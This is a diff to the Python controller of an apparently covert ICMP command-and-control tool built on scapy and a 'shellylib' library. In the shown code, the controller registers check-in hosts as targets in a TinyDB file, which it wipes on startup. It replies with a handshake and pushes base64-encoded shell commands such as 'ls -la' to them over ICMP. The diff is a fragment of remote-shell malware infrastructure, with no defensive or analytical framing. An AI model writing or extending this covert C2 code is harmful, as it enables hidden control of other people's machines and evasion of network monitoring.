@@ -2,9 +2,9 @@
 
 from scapy.all import sr,IP,ICMP,Raw,sniff
 import base64
-from shelly import Host, Target
+from shellylib import Host, Target
 from tinydb import TinyDB, Query
-
+import os
 TTL = int(64)
 ICMP_ID = int(12800)
 
@@ -13,7 +13,9 @@ class Controller(Host):
     def __init__(self):
         super().__init__()
         self.targets = []
-        db = TinyDB('./db.json')
+        if os.path.exists('./db.json'):
+            os.remove('./db.json')
+        self.db = TinyDB('./db.json')
         
     def get_targets(self):
         return self.targets
@@ -22,7 +24,7 @@ class Controller(Host):
         match shellpack['message']:
             case "hello how are you":
                 target = Target(shellpack)
-                self.targets.append(target)
+                self.db.insert(target)
                 self.send(target.ip, "join", "fine thank you")
                 target.update_status("CONNECTED")
                 self.send(target.ip, "instruction", "request", base64.b64encode("ls -la".encode()))
